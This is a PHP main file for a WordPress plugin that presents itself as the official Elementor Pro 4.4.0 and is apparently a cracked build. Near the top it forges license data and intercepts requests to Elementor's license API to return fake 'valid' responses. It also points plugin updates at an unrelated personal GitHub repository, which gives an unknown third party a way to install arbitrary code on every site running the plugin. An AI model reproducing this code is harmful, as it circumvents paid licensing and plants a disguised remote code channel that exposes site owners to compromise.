<?php
/**
 * Plugin Name: Elementor Pro
 * Description: Elevate your designs and unlock the full power of the Atomic Editor. Gain access to dozens of Pro widgets, Website Templates, Theme Builder, Pop Ups, Forms, reusable Components, and WooCommerce building capabilities.
 * Plugin URI: https://go.elementor.com/wp-dash-wp-plugins-author-uri/
 * Version: 4.4.0
 * Author: Elementor.com
 * Author URI: https://go.elementor.com/wp-dash-wp-plugins-author-uri/
 * Requires PHP: 7.4
 * Requires at least: 6.8
 * Requires Plugins: elementor
 * Elementor tested up to: 4.4.0
 * Text Domain: elementor-pro
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

define( 'ELEMENTOR_PRO_VERSION', '4.4.0' );
define( 'ESPACK', plugin_dir_path(__FILE__));
if (get_locale() == 'fa_IR' ) {

$text_domain = 'elementor-pro';
	$ESPACK_lang =  ESPACK . "/languages/elementor-pro-fa_IR.mo";
	$wordpress_lang = "/languages/plugins/elementor-pro-fa_IR.mo";
	unload_textdomain($text_domain);
	load_textdomain($text_domain, $ESPACK_lang );
}
update_option( 'elementor_pro_license_key', '*********' );
update_option(
    '_elementor_pro_license_v2_data',
    [
        'timeout' => strtotime('+12 hours', current_time('timestamp')),
        'value' => json_encode([
            'success' => true,
            'license' => 'valid',
            'expires' => '2030-01-01 12:12:12',
            'subscription_id' => 960,
            'status' => 'ACTIVE',
            'recurring' => false,
            'features' => ["template_access_level_None","kit_access_level_None","activity-log","breadcrumbs","form","posts","template","countdown","slides","price-list","portfolio","flip-box","price-table","login","share-buttons","theme-post-content","theme-post-title","nav-menu","blockquote","media-carousel","animated-headline","facebook-comments","facebook-embed","facebook-page","facebook-button","testimonial-carousel","post-navigation","search-form","post-comments","author-box","call-to-action","post-info","theme-site-logo","theme-site-title","theme-archive-title","theme-post-excerpt","theme-post-featured-image","archive-posts","theme-page-title","sitemap","reviews","table-of-contents","lottie","code-highlight","hotspot","video-playlist","progress-tracker","section-effects","sticky","scroll-snap","page-transitions","mega-menu","nested-carousel","loop-grid","loop-carousel","theme-builder","elementor_icons","elementor_custom_fonts","dynamic-tags","taxonomy-filter","email","email2","mailpoet","mailpoet3","redirect","header","footer","single-post","single-page","archive","search-results","error-404","loop-item","font-awesome-pro","typekit","gallery","off-canvas","link-in-bio-var-2","link-in-bio-var-3","link-in-bio-var-4","link-in-bio-var-5","link-in-bio-var-6","link-in-bio-var-7","search","size-variable","transitions","pro-interactions","atomic-components","element-manager-permissions","akismet","display-conditions","woocommerce-products","wc-products","woocommerce-product-add-to-cart","wc-elements","wc-categories","woocommerce-product-price","woocommerce-product-title","woocommerce-product-images","woocommerce-product-upsell","woocommerce-product-short-description","woocommerce-product-meta","woocommerce-product-stock","woocommerce-product-rating","wc-add-to-cart","dynamic-tags-wc","woocommerce-product-data-tabs","woocommerce-product-related","woocommerce-breadcrumb","wc-archive-products","woocommerce-archive-products","woocommerce-product-additional-information","woocommerce-menu-cart","woocommerce-product-content","woocommerce-archive-description","paypal-button","woocommerce-checkout-page","woocommerce-cart","woocommerce-my-account","woocommerce-purchase-summary","woocommerce-notices","settings-woocommerce-pages","settings-woocommerce-notices","popup","custom-css","global-css","custom_code","custom-attributes","form-submissions","form-integrations","dynamic-tags-acf","dynamic-tags-pods","dynamic-tags-toolset","editor_comments","stripe-button","role-manager","global-widget","activecampaign","cf7db","convertkit","discord","drip","getresponse","mailchimp","mailerlite","slack","webhook","product-single","product-archive","wc-single-elements","atomic-custom-attributes","atomic-custom-css","notes","atomic-loop"],
			'tier' => 'agency',
            'generation' => 'empty',
            'activated' => true,
            'success' => true
        ])
    ]
);add_filter( 'elementor/connect/additional-connect-info', '__return_empty_array', 999 );

add_action( 'plugins_loaded', function() {
add_filter( 'pre_http_request', function( $pre, $parsed_args, $url ) {
if ( strpos( $url, 'my.elementor.com/api/v2/licenses' ) !== false ) {
return [
'response' => [ 'code' => 200, 'message' => 'ОК' ],
'body' => json_encode( [ 'success' => true, 'license' => 'valid', 'expires' => '01.01.2030' ] )
];
} else {
return $pre;
}
}, 10, 3 );
} ); 
require 'plugin-update-checker/plugin-update-checker.php';
$myUpdateChecker = Puc_v4_Factory::buildUpdateChecker(
	'https://raw.githubusercontent.com/saadegh74/test-plugin/main/plugins/updates/up-on/staging/elementor-pro/info.json',
	__FILE__, //Full path to the main plugin file or functions.php.
	'elementor-pro'
);
/**
 * All versions should be `major.minor`, without patch, in order to compare them properly.
 * Therefore, we can't set a patch version as a requirement.
 * (e.g. Core 3.15.0-beta1 and Core 3.15.0-cloud2 should be fine when requiring 3.15, while
 * requiring 3.15.2 is not allowed)
 */
define( 'ELEMENTOR_PRO_REQUIRED_CORE_VERSION', '4.2' );
define( 'ELEMENTOR_PRO_RECOMMENDED_CORE_VERSION', '4.4' );

define( 'ELEMENTOR_PRO__FILE__', __FILE__ );
define( 'ELEMENTOR_PRO_PLUGIN_BASE', plugin_basename( ELEMENTOR_PRO__FILE__ ) );
define( 'ELEMENTOR_PRO_PATH', plugin_dir_path( ELEMENTOR_PRO__FILE__ ) );
define( 'ELEMENTOR_PRO_ASSETS_PATH', ELEMENTOR_PRO_PATH . 'assets/' );
define( 'ELEMENTOR_PRO_MODULES_PATH', ELEMENTOR_PRO_PATH . 'modules/' );
define( 'ELEMENTOR_PRO_URL', plugins_url( '/', ELEMENTOR_PRO__FILE__ ) );
define( 'ELEMENTOR_PRO_ASSETS_URL', ELEMENTOR_PRO_URL . 'assets/' );
define( 'ELEMENTOR_PRO_MODULES_URL', ELEMENTOR_PRO_URL . 'modules/' );

require_once ELEMENTOR_PRO_MODULES_PATH . 'admin-notices/bootstrap.php';

\ElementorPro\Modules\AdminNotices\Classes\Upgrade_Recommendation_Dismissal::register_dismiss_handlers();

/**
 * Load gettext translate for our text domain.
 *
 * @since 1.0.0
 *
 * @return void
 */
function elementor_pro_load_plugin() {
	if ( ! did_action( 'elementor/loaded' ) ) {
		\ElementorPro\Modules\AdminNotices\Bootstrap::register_from_bootstrap( \ElementorPro\Modules\AdminNotices\Bootstrap::NOTICE_FAIL_LOAD );

		return;
	}

	$core_version = ELEMENTOR_VERSION;
	$core_version_required = ELEMENTOR_PRO_REQUIRED_CORE_VERSION;
	$core_version_recommended = ELEMENTOR_PRO_RECOMMENDED_CORE_VERSION;

	if ( ! elementor_pro_compare_major_version( $core_version, $core_version_required, '>=' ) ) {
		\ElementorPro\Modules\AdminNotices\Bootstrap::register_from_bootstrap( \ElementorPro\Modules\AdminNotices\Bootstrap::NOTICE_OUT_OF_DATE );

		return;
	}

	if ( ! elementor_pro_compare_major_version( $core_version, $core_version_recommended, '>=' ) ) {
		\ElementorPro\Modules\AdminNotices\Bootstrap::register_from_bootstrap( \ElementorPro\Modules\AdminNotices\Bootstrap::NOTICE_UPGRADE_RECOMMENDATION );
	}

	require ELEMENTOR_PRO_PATH . 'plugin.php';
}

function elementor_pro_compare_major_version( $left, $right, $operator ) {
	$pattern = '/^(\d+\.\d+).*/';
	$replace = '$1.0';

	$left  = preg_replace( $pattern, $replace, $left );
	$right = preg_replace( $pattern, $replace, $right );

	return version_compare( $left, $right, $operator );
}

add_action( 'plugins_loaded', 'elementor_pro_load_plugin' );

function print_error( $message ) {
	$renderer = new \ElementorPro\Modules\AdminNotices\Components\Notice_Renderer();
	$renderer->print_legacy_error( (string) $message );
}

function elementor_pro_fail_load() {
	( new \ElementorPro\Modules\AdminNotices\Notices\Fail_Load_Notice() )->print();
}

function elementor_pro_fail_load_out_of_date() {
	( new \ElementorPro\Modules\AdminNotices\Notices\Out_Of_Date_Notice() )->print();
}

function elementor_pro_admin_notice_upgrade_recommendation() {
	( new \ElementorPro\Modules\AdminNotices\Notices\Upgrade_Recommendation_Notice() )->print();
}

if ( ! function_exists( '_is_elementor_installed' ) ) {

	function _is_elementor_installed() {
		$file_path = 'elementor/elementor.php';
		$installed_plugins = get_plugins();

		return isset( $installed_plugins[ $file_path ] );
	}
}
